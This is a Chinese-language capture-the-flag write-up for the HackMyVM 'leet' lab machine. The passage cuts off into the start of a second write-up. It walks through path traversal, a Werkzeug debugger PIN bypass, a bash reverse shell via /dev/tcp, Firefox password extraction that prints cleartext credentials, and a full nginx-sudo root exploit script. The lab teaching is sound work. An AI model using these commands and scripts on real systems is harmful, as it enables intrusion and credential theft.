`/etc/crontab`\uff1a\u5b58\u50a8 cron \u4f5c\u4e1a\u7684\u6587\u4ef6\uff0c\u8fd9\u4e9b\u4f5c\u4e1a\u662f\u5b9a\u65f6\u6267\u884c\u7684\u4efb\u52a1\u3002\n4. `/etc/apt/sources.list`\uff1aDebian \u7cfb Linux \u53d1\u884c\u7248\uff08\u5982 Ubuntu\uff09\u7684\u8f6f\u4ef6\u6e90\u5217\u8868\u6587\u4ef6\uff0c\u7528\u4e8e\u6307\u5b9a\u8f6f\u4ef6\u5305\u7ba1\u7406\u5668\uff08\u5982 APT\uff09\u4ece\u54ea\u91cc\u4e0b\u8f7d\u8f6f\u4ef6\u5305\u3002\n5. `/etc/apache2/apache2.conf`\uff1aApache HTTP \u670d\u52a1\u5668\u7684\u4e3b\u914d\u7f6e\u6587\u4ef6\u3002\n6. `/etc/group`\uff1a\u5b58\u50a8\u7cfb\u7edf\u7ec4\u4fe1\u606f\u7684\u6587\u4ef6\uff0c\u5305\u62ec\u7ec4\u540d\u548c\u7ec4\u6210\u5458\u3002\n7. `/etc/hosts.deny`\uff1a\u7528\u4e8e\u6307\u5b9a\u4e0d\u5141\u8bb8\u8bbf\u95ee\u7cfb\u7edf\u7684\u4e3b\u673a\u548c\u670d\u52a1\u3002\n8. `/etc/hosts.allow`\uff1a\u7528\u4e8e\u6307\u5b9a\u5141\u8bb8\u8bbf\u95ee\u7cfb\u7edf\u7684\u4e3b\u673a\u548c\u670d\u52a1\u3002\n9. `/etc/hosts`\uff1a\u5b58\u50a8\u672c\u5730 DNS \u89e3\u6790\u7684\u6587\u4ef6\uff0c\u7528\u4e8e\u5c06\u4e3b\u673a\u540d\u6620\u5c04\u5230 IP \u5730\u5740\u3002\n10. `/etc/nsswitch.conf`\uff1a\u63a7\u5236\u7cfb\u7edf\u540d\u79f0\u670d\u52a1\u5207\u6362\u7684\u914d\u7f6e\u6587\u4ef6\u3002\n11. `/etc/netconfig`\uff1a\u7f51\u7edc\u914d\u7f6e\u6587\u4ef6\uff0c\u5305\u542b\u7f51\u7edc\u670d\u52a1\u548c\u534f\u8bae\u7684\u914d\u7f6e\u4fe1\u606f\u3002\n12. `/etc/motd`\uff1a\u7cfb\u7edf\u542f\u52a8\u65f6\u663e\u793a\u7684\u6d88\u606f\uff0c\u901a\u5e38\u662f\u7cfb\u7edf\u4fe1\u606f\u548c\u7248\u6743\u58f0\u660e\u3002\n13. `/etc/issue`\uff1a\u663e\u793a\u5728\u767b\u5f55\u63d0\u793a\u7b26\u4e4b\u524d\u7684\u7cfb\u7edf\u4fe1\u606f\u3002\n14. `/etc/init.d/apache2`\uff1aApache HTTP \u670d\u52a1\u5668\u7684\u521d\u59cb\u5316\u811a\u672c\uff0c\u7528\u4e8e\u542f\u52a8\u548c\u505c\u6b62\u670d\u52a1\u3002\n15. `/etc/ssh/sshd_config`\uff1aSSH \u5b88\u62a4\u8fdb\u7a0b\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u7528\u4e8e\u63a7\u5236 SSH \u670d\u52a1\u7684\u884c\u4e3a\u3002\n16. `/etc/rpc`\uff1a\u5b58\u50a8 RPC \u670d\u52a1\u4fe1\u606f\u7684\u6587\u4ef6\u3002\n17. `/etc/resolv.conf`\uff1aDNS \u89e3\u6790\u5668\u914d\u7f6e\u6587\u4ef6\uff0c\u6307\u5b9a DNS \u670d\u52a1\u5668\u5730\u5740\u3002\n18. `/var/log/lastlog`\uff1a\u5b58\u50a8\u7528\u6237\u6700\u540e\u767b\u5f55\u4fe1\u606f\u7684\u65e5\u5fd7\u6587\u4ef6\u3002\n19. `/var/run/utmp`\uff1a\u5b58\u50a8\u5f53\u524d\u767b\u5f55\u7528\u6237\u4fe1\u606f\u7684\u6587\u4ef6\u3002\n20. `/var/log/wtmp`\uff1a\u5b58\u50a8\u7cfb\u7edf\u767b\u5f55\u5386\u53f2\u8bb0\u5f55\u7684\u65e5\u5fd7\u6587\u4ef6\u3002\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.208:7777/download?filename=../../../../etc/hosts  \n127.0.0.1       localhost\n127.0.1.1       leet.hmv\n\n# The following lines are desirable for IPv6 capable hosts\n::1     localhost ip6-localhost ip6-loopback\nff02::1 ip6-allnodes\nff02::2 ip6-allrouters\n\n```\n\n\u6709\u4e2a\u57df\u540d\uff0c\u52a0\u5165\u6211\u4eec\u7684 hosts \u4e2d\uff0c\u91cd\u65b0\u8bbf\u95ee\u3002\u4e0d\u80fd\u8bf4\u6beb\u4e0d\u76f8\u5e72\uff0c\u53ea\u80fd\u8bf4\u4e00\u6a21\u4e00\u6837\uff0c\u90a3\u8fd8\u662f\u7206\u7834\u4e00\u4e0b\u7f51\u5740\u76ee\u5f55\u5427\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ gobuster dir -u http://leet.hmv:7777/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,md -b 404\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://leet.hmv:7777/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,html,txt,md\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/download             (Status: 500) [Size: 14478]\n/console              (Status: 200) [Size: 1563]\nProgress: 7971 / 150005 (5.31%)^C\n[!] Keyboard interrupt detected, terminating.\nProgress: 8345 / 150005 (5.56%)\n[ERROR] context canceled\n===============================================================\nFinished\n===============================================================\n```\n\n\u7206\u51fa `/console` \u6211\u5c31\u505c\u4e86\uff0c\u540e\u9762\u5168\u662f\u62a5\u9519\u3002\u8bbf\u95ee `/console` \u4ed6\u8981 PIN \u624d\u53ef\u4ee5\u6709\uff0c\u7528 whatweb \u770b\u770b\u4ed6\u662f\u4ec0\u4e48\u4e1c\u897f\n\n```\n\u2514\u2500$ whatweb http://leet.hmv:7777/console   \nhttp://leet.hmv:7777/console [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.0.1 Python/3.11.2], IP[192.168.205.208], Python[3.11.2], Script, Title[Console // Werkzeug Debugger], Werkzeug[3.0.1]\n```\n\n# 3.PIN\u83b7\u53d6\n\n\u662f Werkzeug Debugger\uff0c\u4f7f\u7528 google \u641c\u7d22\u770b\u6709\u6ca1\u6709\u6f0f\u6d1e\u53ef\u4ee5\u5229\u7528\uff0c\u627e\u5230\u4e86\u4e00\u7bc7 [github \u7684\u6587\u7ae0](https://github.com/wdahlenburg/werkzeug-debug-console-bypass)\u7b26\u5408\u6211\u4eec\u7684\u5229\u7528\u573a\u666f\n\n\u6309\u7167\u4ed6\u7684\u63d0\u793a\u5229\u7528\u811a\u672c\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ git clone https://github.com/wdahlenburg/werkzeug-debug-console-bypass.git             \n\u6b63\u514b\u9686\u5230 'werkzeug-debug-console-bypass'...\nremote: Enumerating objects: 27, done.\nremote: Counting objects: 100% (27/27), done.\nremote: Compressing objects: 100% (22/22), done.\nremote: Total 27 (delta 10), reused 10 (delta 3), pack-reused 0 (from 0)\n\u63a5\u6536\u5bf9\u8c61\u4e2d: 100% (27/27), 8.41 KiB | 4.20 MiB/s, \u5b8c\u6210.\n\u5904\u7406 delta \u4e2d: 100% (10/10), \u5b8c\u6210.\n```\n\n\u6253\u5f00 `werkzeug-pin-bypass.py` \u4fee\u6539\u5bf9\u5e94\u70b9\n\nusername\uff1a\u6211\u521a\u521a\u5c1d\u8bd5\u8bfb\u4ed6\u7684 ssh \u5bc6\u94a5\u8fde `riva` \u7528\u6237\u7684\u90fd\u4e0d\u7ed9\u6211\u8bfb\uff08\u5f53\u7136\u6ca1\u6709\u4e5f\u8bfb\u4e0d\u5230\uff09\uff0c\u5c31\u53ea\u53ef\u80fd\u662f `www-data` \u548c `riva` \u4e86\uff0c\u4f46\u662f\u6211\u731c\u662f www-data\n\nmodname:\u4ed6\u7ed9\u7684\u6a21\u677f\u662f `/usr/local/lib/python3.9/site-packages/flask/app.py`\uff0cpython \u7248\u672c\u524d\u9762\u63a2\u6d4b\u5230\u4e86\uff0c\u662f 3.11.2\uff0c\u901a\u5e38\u8def\u5f84\u53ea\u5199\u5230 3.11\uff0c\u6240\u4ee5 `/usr/local/lib/python3.11/site-packages/flask/app.py`\n\n![image](https://github.com/user-attachments/assets/747cb5cb-511b-4a16-9338-126db5dd7ace)\n\n\uff08mmp\uff0c\u7741\u773c\u770b\u4e16\u754c\uff09\u5e78\u597d\u62a5\u9519\u5199\u4e86\uff0c\u4e0d\u7136\u6211\u731c\u5230\u660e\u5e74\n\nuuid:\u670d\u52a1\u5668\u6258\u7ba1\u63a5\u53e3\u7684 Mac \u5730\u5740\uff0c\u4ed6\u7ed9\u7684\u6a21\u677f\u662f `/sys/class/net/eth0/address`\uff0c\u8bbf\u95ee\u4e86\uff0c\u6ca1\u6709\u8fd9\u4e2a\u6587\u4ef6\uff0c\u5e94\u8be5\u662f\u6362\u4e86\u7f51\u5361\uff0c\u53bb\u95ee\u4e86\u95ee GPT\uff0c\u4ed6\u8bf4\u53ef\u4ee5\u901a\u8fc7 `/etc/network/interfaces` \u6587\u4ef6\u4e86\u89e3\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.208:7777/download?filename=../../../etc/network/interfaces             \n# This file describes the network interfaces available on your system\n# and how to activate them. For more information, see interfaces(5).\n\nsource /etc/network/interfaces.d/*\n\n# The loopback network interface\nauto lo\niface lo inet loopback\n\n# The primary network interface\nallow-hotplug enp0s3\niface enp0s3 inet dhcp\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.208:7777/download?filename=../../../sys/class/net/enp0s3/address\n08:00:27:39:2c:58\ncurl: (18) end of response with 4078 bytes missing\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ python3            \nPython 3.12.8 (main, Dec 13 2024, 13:19:48) [GCC 14.2.0] on linux\nType 'help', 'copyright', 'credits' or 'license' for more information.\n>>> ''.join('08:00:27:39:2c:58'.split(':'))\n'080027392c58'\n>>> print(0x080027392c58)\n8796751080536\n\n```\n\n\u8dd1\u4e00\u4e0b `/etc/machine-id`\u3001`/proc/sys/kernel/random/boot_id`\u3001`/proc/self/cgroup`\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.208:7777/download?filename=../../../etc/machine-id        \nf6791f240ce6407ea271e86b78ac3bdb\n                                                                                                                                 \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.208:7777/download?filename=../../../proc/sys/kernel/random/boot_id\n                                                                                                                                 \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.208:7777/download?filename=../../../proc/self/cgroup        \n \n```\n\n/etc/machine-id\uff1af6791f240ce6407ea271e86b78ac3bdb\n\n/proc/sys/kernel/random/boot_id\uff1a\n\n/proc/self/cgroup\uff1a\n\n\u8dd1\u4e0d\u51fa\u6765\uff0c\u5199\u4e2a\u811a\u672c\u8dd1\u8dd1\u8bd5\u8bd5\uff0c\u4e0d\u884c\u5c31\u53bb\u6284\u5176\u4ed6\u5e08\u5085\u7684 wp[\u72d7\u5934]\n\n```\n#!/bin/bash\n\nfor i in {1..200}; do\n  curl -s -o /tmp/response.tmp http://192.168.205.208:7777/download?filename=../../../proc/self/cgroup\n  if [ -s /tmp/response.tmp ]; then\n    echo 'Attempt $i: Success'\n    cat /tmp/response.tmp\n    break\n  else\n    echo 'Attempt $i: Failed'\n    rm -f /tmp/response.tmp\n  fi\ndone\n```\n\n\u8dd1\u4e0d\u51fa\u6765\uff0c\u53bb [HGBE](https://hackmyvm.eu/profile/?user=HGBE) \u5e08\u5085\u90a3\u6284\u4e86\u4e00\u4e2a\n\n/proc/sys/kernel/random/boot_id\uff1ada68b9a7-336e-40df-879a-f38a6447bfe9\n\n/proc/self/cgroup\uff1a0::/system.slice/flaskapp.service\n\n\u6839\u636e\u4ed6\u7ed9\u7684\u811a\u672c\u83b7\u5f97 id\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test/werkzeug-debug-console-bypass]\n\u2514\u2500$ vim id.py                                                      \n                                                                                                                                 \n\u250c\u2500\u2500(kali\u327fkali)-[~/test/werkzeug-debug-console-bypass]\n\u2514\u2500$ cat id.py   \nmachine_id = b''\nfor filename in 'machine-id', 'boot_id':\n    try:\n        with open(filename, 'rb') as f:\n            value = f.readline().strip()\n    except OSError:\n        continue\n\n    if value:\n        machine_id += value\n        break\ntry:\n    with open('cgroup', 'rb') as f:\n        machine_id += f.readline().strip().rpartition(b'/')[2]\nexcept OSError:\n    pass\n\nprint(machine_id)\n                                                                                                                                 \n\u250c\u2500\u2500(kali\u327fkali)-[~/test/werkzeug-debug-console-bypass]\n\u2514\u2500$ echo 'f6791f240ce6407ea271e86b78ac3bdb' > machine-id\n                                                                                                                                 \n\u250c\u2500\u2500(kali\u327fkali)-[~/test/werkzeug-debug-console-bypass]\n\u2514\u2500$ echo 'da68b9a7-336e-40df-879a-f38a6447bfe9' > boot_id\n                                                                                                                                 \n\u250c\u2500\u2500(kali\u327fkali)-[~/test/werkzeug-debug-console-bypass]\n\u2514\u2500$ echo '0::/system.slice/flaskapp.service' > cgroup  \n                                                                                                                                 \n\u250c\u2500\u2500(kali\u327fkali)-[~/test/werkzeug-debug-console-bypass]\n\u2514\u2500$ chmod +x id.py  \n                                                                                                                                 \n\u250c\u2500\u2500(kali\u327fkali)-[~/test/werkzeug-debug-console-bypass]\n\u2514\u2500$ python3 id.py    \nb'f6791f240ce6407ea271e86b78ac3bdbflaskapp.service'\n```\n\n\u6574\u4e2a\u4ee3\u7801\u6539\u5b8c\u662f\u8fd9\u6837\u7684\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test/werkzeug-debug-console-bypass]\n\u2514\u2500$ cat werkzeug-pin-bypass.py  \n  \n#!/bin/python3\nimport hashlib\nfrom itertools import chain\n\nprobably_public_bits = [\n        'www-data',# username\n        'flask.app',# modname\n        'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))\n        '/opt/project/venv/lib/python3.11/site-packages/flask/app.py' # getattr(mod, '__file__', None),\n]\n\nprivate_bits = [\n        '8796751080536',# str(uuid.getnode()),  /sys/class/net/ens33/address \n        # Machine Id: /etc/machine-id + /proc/sys/kernel/random/boot_id + /proc/self/cgroup\n        'f6791f240ce6407ea271e86b78ac3bdbflaskapp.service'\n]\n\nh = hashlib.sha1() # Newer versions of Werkzeug use SHA1 instead of MD5\nfor bit in chain(probably_public_bits, private_bits):\n        if not bit:\n                continue\n        if isinstance(bit, str):\n                bit = bit.encode('utf-8')\n        h.update(bit)\nh.update(b'cookiesalt')\n\ncookie_name = '__wzd' + h.hexdigest()[:20]\n\nnum = None\nif num is None:\n        h.update(b'pinsalt')\n        num = ('%09d' % int(h.hexdigest(), 16))[:9]\n\nrv = None\nif rv is None:\n        for group_size in 5, 4, 3:\n                if len(num) % group_size == 0:\n                        rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')\n                                                  for x in range(0, len(num), group_size))\n                        break\n        else:\n                rv = num\n\nprint('Pin: ' + rv)\n```\n\n\u8fd0\u884c werkzeug-pin-bypass.py \u83b7\u5f97 PIN\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test/werkzeug-debug-console-bypass]\n\u2514\u2500$ python3 werkzeug-pin-bypass.py\nPin: 113-565-783\n```\n\n\u6210\u529f\u767b\u5165\uff0c\u6709\u70b9\u5c34\u5c2c\u54c8\uff0c\u4e0d\u662f ssti\uff0c\u53ea\u662f\u5355\u7eaf\u7684 python\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ sudo tcpdump -A -n icmp  #\u5f00\u4e2a\u76d1\u542c\n```\n\n```\n>>> import os\n>>> os.system('id')\n0\n>>> os.system('ping -c2 192.168.205.141')\n```\n\n\u4ed6\u56de\u663e\u4e2a 0\uff0cping \u4e00\u4e0b\u770b\u6709\u6ca1\u6709\u5305\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ sudo tcpdump -A -n icmp                    \ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes\n16:30:30.290786 IP 192.168.205.208 > 192.168.205.141: ICMP echo request, id 30409, seq 1, length 64\nE..T..@.@.Q_............v.....og....g<...................... !'#$%&'()*+,-./01234567\n16:30:30.290806 IP 192.168.205.141 > 192.168.205.208: ICMP echo reply, id 30409, seq 1, length 64\nE..T....@.W;............v.....og....g<...................... !'#$%&'()*+,-./01234567\n16:30:31.313700 IP 192.168.205.208 > 192.168.205.141: ICMP echo request, id 30409, seq 2, length 64\nE..T..@.@.P...........V.v.....og............................ !'#$%&'()*+,-./01234567\n16:30:31.313721 IP 192.168.205.141 > 192.168.205.208: ICMP echo reply, id 30409, seq 2, length 64\nE..T....@.W...........^.v.....og............................ !'#$%&'()*+,-./01234567\n\n```\n\n\u6709\u5305\uff0c\u5f39\u4e2a shell \u56de\u6765\n\n```\n>>> os.system('bash -c 'bash -i >& /dev/tcp/192.168.205.141/8888 0>&1'')\n```\n\n# 4. \u63d0\u6743\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nc -lvnp 8888\nlistening on [any] 8888 ...\nconnect to [192.168.205.141] from (UNKNOWN) [192.168.205.208] 40200\nbash: cannot set terminal process group (540): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@leet:/opt/project$ id\nid\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nwww-data@leet:/opt/project$ sudo -l\nsudo -l\nMatching Defaults entries for www-data on leet:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,\n    use_pty\n\nUser www-data may run the following commands on leet:\n    (riva) NOPASSWD: /usr/bin/micro\n\n```\n\n\u53ef\u4ee5\u7528 `riva` \u6267\u884c `/usr/bin/micro` \u4f7f\u7528 [gtfobins](https://gtfobins.github.io/) \u641c\u7d22\u6ca1\u6709\u7ed3\u679c\uff0c\u90a3\u6211\u4eec\u770b\u770b\u4ed6\u5e2e\u52a9\u5427\n\n```\nwww-data@leet:/opt/project$ /usr/bin/micro -h\nUsage: micro [OPTIONS] [FILE]...\n-clean\n        Cleans the configuration directory\n-config-dir dir\n        Specify a custom location for the configuration directory\n[FILE]:LINE:COL (if the `parsecursor` option is enabled)\n+LINE:COL\n        Specify a line and column to start the cursor at when opening a buffer\n-options\n        Show all option help\n-debug\n        Enable debug mode (enables logging to ./log.txt)\n-version\n        Show the version number and information\n\nMicro's plugin's can be managed at the command line with the following commands.\n-plugin install [PLUGIN]...\n        Install plugin(s)\n-plugin remove [PLUGIN]...\n        Remove plugin(s)\n-plugin update [PLUGIN]...\n        Update plugin(s) (if no argument is given, updates all plugins)\n-plugin search [PLUGIN]...\n        Search for a plugin\n-plugin list\n        List installed plugins\n-plugin available\n        List available plugins\n\nMicro's options can also be set via command line arguments for quick\nadjustments. For real configuration, please use the settings.json\nfile (see 'help options').\n\n-option value\n        Set `option` to `value` for this session\n        For example: `micro -syntax off file.c`\n\nUse `micro -options` to see the full list of configuration options\n\n```\n\n\u6ca1\u4ec0\u4e48\u6709\u7528\u7684\u4fe1\u606f\uff0c\u8fd0\u884c\u4e00\u4e0b\u770b\u770b\u662f\u4ec0\u4e48\n\n```\nww-data@leet:/var/www/html$ sudo -u riva /usr/bin/micro\n```\n\n![image](https://github.com/user-attachments/assets/bc8598d6-1641-4cb9-8c63-ace450ad38f9)\n\n\u548c vim \u7c7b\u4f3c\u6587\u672c\u7f16\u8f91\u5668\uff0c\u641c\u7d22\u4e00\u4e0b\u6709\u6ca1\u6709\u547d\u4ee4\u884c\n\n![image](https://github.com/user-attachments/assets/5b94dfee-41c9-4dc7-95d7-7e66d2a3aa09)\n\n```\nctrl+b \n$ /bin/bash\nriva@leet:/var/www/html$ \n```\n\n\u6210\u529f\u8fdb\u6765\uff0c\u770b\u4e86\u4e00\u5708\u90fd\u6ca1\u6709\u4ec0\u4e48\u53d1\u73b0,\u628a linpeas.sh \u4f20\u4e0a\u53bb\u770b\u770b\uff0c\u4e5f\u662f\u6ca1\u770b\u5230\u4ec0\u4e48\u91cd\u8981\u7684\u4e1c\u897f\uff0c\u53bb\u770b\u4e86 [HGBE](https://hackmyvm.eu/profile/?user=HGBE) \u7684 wp\uff0c\u53d1\u73b0\u662f\u6211\u4e0d\u591f\u5927\u80c6\uff0c\u53cd\u6b63\u6211\u60f3\u4e0d\u5230\u4ece firefox \u63d0\u53d6\u5bc6\u7801\n\n[Firefox Decrypt](https://github.com/unode/firefox_decrypt)\n\n```\nriva@leet:~$ python3 firefox_decrypt.py\nSelect the Mozilla profile you wish to decrypt\n1 -> zbznfk37.default\n2 -> guu30cui.default-esr\n2\n\nWebsite:   chrome://FirefoxAccounts\nUsername: '1db9561103ca4adc9afa6357c0a0b554'\nPassword: '{'version':1,'accountData':{'scopedKeys':{'https://identity.mozilla.com/apps/oldsync':{'kid':'1603273389635-IxsZ6HpGK9fL9tUfdcBqwA','k':'Q8lFF-E91kvogabSQ2yjKj7k2JHX30UDeHEriaxaCY5slUVmtQvP-e3is5GxBiUKkG3g4dQLbFRsVOYeMkjNpg','kty':'oct'},'sync:addon_storage':{'kid':'1603273389635-Ng9dJrdpVFqEoBs-R3LaTMKTiSWhWypqfmg9MJDby4U','k':'L8MGJk3tWVlmN9Sm-MmdauxuQ38fIl--NziTjg_AmjO51_-vHo70OELMwif8kqn2zE3Yqg30BLw1ndNplRzGCA','kty':'oct'}},'kSync':'43c94517e13dd64be881a6d2436ca32a3ee4d891d7df450378712b89ac5a098e6c954566b50bcff9ede2b391b106250a906de0e1d40b6c546c54e61e3248cda6','kXCS':'231b19e87a462bd7cbf6d51f75c06ac0','kExtSync':'2fc306264ded59596637d4a6f8c99d6aec6e437f1f225fbe3738938e0fc09a33b9d7ffaf1e8ef43842ccc227fc92a9f6cc4dd8aa0df404bc359dd369951cc608','kExtKbHash':'360f5d26b769545a84a01b3e4772da4cc2938925a15b2a6a7e683d3090dbcb85'}}'\n\nWebsite:   http://leet.hmv\nUsername: 'riva'\nPassword: 'PGH$2r0co3L5QL'\n\nWebsite:   https://hackmyvm.eu\nUsername: 'riva'\nPassword: 'lovelove80'\n\nriva@leet:~$ sudo -l\n[sudo] password for riva: \nMatching Defaults entries for riva on leet:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\n\nUser riva may run the following commands on leet:\n    (root) /usr/sbin/nginx\n```\n\n\u7136\u540e\u5c31\u662f\u6211\u4eec\u7684\u8001\u4f19\u8ba1\u4e0a\u573a\u4e86\uff0cnginx [\u63d0\u6743\u65b9\u6cd5](https://gist.github.com/DylanGrl/ab497e2f01c7d672a80ab9561a903406)\n\n```\nriva@leet:~$ cat exploit.sh\n\necho '[+] Creating configuration...'\ncat << EOF > /tmp/nginx_pwn.conf\nuser root;\nworker_processes 4;\npid /tmp/nginx.pid;\nevents {\n        worker_connections 768;\n}\nhttp {\n        server {\n                listen 1339;\n                root /;\n                autoindex on;\n                dav_methods PUT;\n        }\n}\nEOF\necho '[+] Loading configuration...'\nsudo nginx -c /tmp/nginx_pwn.conf\necho '[+] Generating SSH Key...'\nssh-keygen\necho '[+] Display SSH Private Key for copy...'\ncat .ssh/id_rsa\necho '[+] Add key to root user...'\ncurl -X PUT localhost:1339/root/.ssh/authorized_keys -d '$(cat .ssh/id_rsa.pub)'\necho '[+] Use the SSH key to get access'\n\n\nriva@leet:~$ bash exploit.sh \nriva@leet:~/.ssh$ ssh -i id_rsa root@127.0.0.1\nroot@leet:~#  id\nuid=0(root) gid=0(root) groups=0(root)\n\n```sentence", "top": 0, "createdAt": 1751016797, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P107": {"htmlDir": "docs/post/hmv_logan2.html", "labels": ["HackMyVM"], "postTitle": "hmv_logan2", "postUrl": "post/hmv_logan2.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/107", "commentNum": 0, "wordCount": 18240, "description": "# hmv_logan2\n\n# 0.\u7b80\u4ecb\n\n**\u9776\u673a**\uff1a[hackmyvm - logan2](https://hackmyvm.eu/machines/machine.php?vm=logan2)\n**\u96be\u5ea6**\uff1a\u9ec4\u8272\n**\u76ee\u6807 IP**\uff1a192.168.205.144\n**\u672c\u673a IP**\uff1a192.168.205.141\n\n# 1.\u626b\u63cf\n\n`nmap`\u8d77\u624b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nmap -sS --min-rate 10000 -p- -Pn -sV 192.168.205.144\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-01-20 16:59 CST\nNmap scan report for 192.168.205.144\nHost is up (0.00045s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)\n80/tcp   open  http    Apache httpd 2.4.57 ((Debian))\n3000/tcp open  http    Golang net/http server\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port3000-TCP:V=7.95%I=7%D=1/20%Time=678E107B%P=x86_64-pc-linux-gnu%r(Ge\nSF:nericLines,67,'HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20t\nSF:ext/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x\nSF:20Request')%r(GetRequest,1000,'HTTP/1\\.0\\x20200\\x20OK\\r\\nContent-Type:\\\nSF:x20text/html;\\x20charset=UTF-8\\r\\nSet-Cookie:\\x20lang=en-US;\\x20Path=/;\nSF:\\x20Max-Age=2147483647\\r\\nSet-Cookie:\\x20i_like_gitea=abfb225a6c69b259;\nSF:\\x20Path=/;\\x20HttpOnly\\r\\nSet-Cookie:\\x20_csrf=1KgRX_Fci-rGge6j5LIyElk\nSF:Aqp46MTczNzM2MzU3ODgyMTcyMjg4Mg;\\x20Path=/;\\x20Expires=Tue,\\x2021\\x20Ja\nSF:n\\x202025\\x2008:59:38\\x20GMT;\\x20HttpOnly\\r\\nX-Frame-Options:\\x20SAMEOR\nSF:IGIN\\r\\nDate:\\x20Mon,\\x2020\\x20Jan\\x202025\\x2008:59:38\\x20GMT\\r\\n\\r\\n<!\nSF:DOCTYPE\\x20html>\\n<html\\x20lang=\\'en-US\\'\\x20class=\\'theme-\\'>\\n<head\\x\nSF:20data-suburl=\\'\\'>\\n\\t<meta\\x20charset=\\'utf-8\\'>\\n\\t<meta\\x20name=\\'v\nSF:iewport\\'\\x20content=\\'width=device-width,\\x20initial-scale=1\\'>\\n\\t<me\nSF:ta\\x20http-equiv=\\'x-ua-compatible\\'\\x20content=\\'ie=edge\\'>\\n\\t<title>\nSF:\\x20Gitea:\\x20Git\\x20with\\x20a\\x20cup\\x20of\\x20tea\\x20</title>\\n\\t<link\nSF:\\x20rel=\\'manifest\\'\\x20href=\\'/manifest\\.json\\'\\x20crossorigin=\\'use-c\nSF:redentials\\'>\\n\\t<meta\\x20name=\\'theme-color\\'\\x20content=\\'#6cc644\\'>\\\nSF:n\\t<meta\\x20name=\\'author\\'\\x20content=\\'Gitea\\x20-\\x20Git\\x20with\\x20a\nSF:\\x20cup\\x20of\\x20tea\\'\\x20/>\\n\\t<meta\\x20name=\\'description\\'\\x20conten\nSF:t=\\'Gitea\\x20\\(Git\\x20with\\x20a\\x20cup\\x20of\\x20tea\\)\\x20is\\x20a\\x20pai\nSF:nless')%r(Help,67,'HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\\nSF:x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20B\nSF:ad\\x20Request')%r(HTTPOptions,1000,'HTTP/1\\.0\\x20404\\x20Not\\x20Found\\r\\\nSF:nContent-Type:\\x20text/html;\\x20charset=UTF-8\\r\\nSet-Cookie:\\x20lang=en\nSF:-US;\\x20Path=/;\\x20Max-Age=2147483647\\r\\nSet-Cookie:\\x20i_like_gitea=aa\nSF:35213287ba9b56;\\x20Path=/;\\x20HttpOnly\\r\\nSet-Cookie:\\x20_csrf=ibf5qw0V\nSF:W54yX8vVkKfbkR8gck06MTczNzM2MzU3ODgzNzkzMjYzOA;\\x20Path=/;\\x20Expires=T\nSF:ue,\\x2021\\x20Jan\\x202025\\x2008:59:38\\x20GMT;\\x20HttpOnly\\r\\nX-Frame-Opt\nSF:ions:\\x20SAMEORIGIN\\r\\nDate:\\x20Mon,\\x2020\\x20Jan\\x202025\\x2008:59:38\\x\nSF:20GM